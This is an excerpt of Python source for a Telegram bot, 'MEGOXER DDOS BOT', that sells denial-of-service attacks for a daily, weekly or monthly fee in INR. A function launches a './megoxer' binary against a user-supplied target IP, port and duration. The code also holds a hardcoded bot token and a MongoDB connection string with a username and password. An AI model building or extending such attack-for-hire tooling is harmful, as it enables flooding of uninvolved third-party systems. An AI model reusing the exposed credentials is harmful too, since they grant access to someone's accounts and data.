...
TOKEN = '8041609126:AAHHD58XWDzHbOrKjDdZ9BjiyyAfg0WsWBw'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002178050926
CHANNEL_ID = -1002178050926
error_channel_id = -1002178050926
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./megoxer {target_ip} {target_port} {duration} 1"
    try:
...
def send_welcome(message):
    ...
    bot.send_message(message.chat.id, "*🔆 WELCOME TO MEGOXER DDOS BOT 🔆*", reply_markup=markup, parse_mode='Markdown')
...
def handle_message(message):
    ...
    if message.text == "MEGOXER":
        ...
        bot.reply_to(message, "*𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘\n\n[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n> DAY - 150 INR\n> WEEK - 700 INR\n\n[𝗣𝗹𝗮𝘁𝗶𝗻𝘂𝗺]\n> MONTH - 1600 INR\n\nDM TO BUY @MEGOXER*", parse_mode='Markdown')
